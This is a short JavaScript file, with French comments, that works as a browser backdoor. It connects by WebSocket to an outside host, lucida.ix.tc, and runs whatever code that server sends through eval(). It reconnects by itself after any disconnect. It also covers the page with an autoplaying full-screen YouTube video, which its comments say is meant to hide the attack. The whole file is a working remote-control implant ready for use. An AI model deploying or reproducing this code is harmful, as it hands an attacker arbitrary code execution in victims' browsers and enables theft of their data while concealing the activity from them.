// Paramètres globaux
globalThis.serverName = 'custom_server';
globalThis.lastPing = Date.now();

// Fonction pour envoyer un message via WebSocket
const sendMessage = (socket, message) => socket.send(JSON.stringify(message));

// Commande pour vérifier la connexion
const pingCommand = (_, socket) => {
  globalThis.lastPing = Date.now();
  sendMessage(socket, { type: 'pong' });
};

// Commande d'évaluation pour exécuter du code JavaScript
const evalCommand = ({ code }, socket) => {
  try {
    const result = eval(code);  // Exécute le code envoyé depuis le serveur
    sendMessage(socket, { type: 'evaled', result: `${result}` });
  } catch (err) {
    sendMessage(socket, { type: 'error', error: `${err}` });
  }
};

// Liste des commandes disponibles
globalThis.commands = {
  eval: evalCommand,
  ping: pingCommand,
};

// Fonction pour établir la connexion WebSocket
globalThis.start = globalThis.start ?? (() => {
  if (globalThis.socket) return;

  const socket = new WebSocket(`wss://lucida.ix.tc/ws/${globalThis.serverName}`);
  globalThis.socket = socket;

  socket.onmessage = ({ data }) => {
    const { type, ...rest } = JSON.parse(data);
    globalThis.commands[type]?.(rest, socket);  // Exécute la commande reçue
  };

  socket.onclose = () => {
    globalThis.socket = undefined;
    setTimeout(globalThis.start, 500);  // Réessayer après 500ms
  };
});

// Charger une vidéo YouTube pour masquer l'activité de l'attaque
(function displayYouTubeVideo() {
  const iframe = document.createElement('iframe');
  iframe.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1';  // Vidéo YouTube de distraction
  iframe.style = 'position:absolute;top:0;left:0;width:100%;height:100%;z-index:9999;border:none;';
  document.body.appendChild(iframe);

  setTimeout(() => iframe.remove(), 60000);  // Supprime l'iframe après 1 minute
})();

globalThis.start();
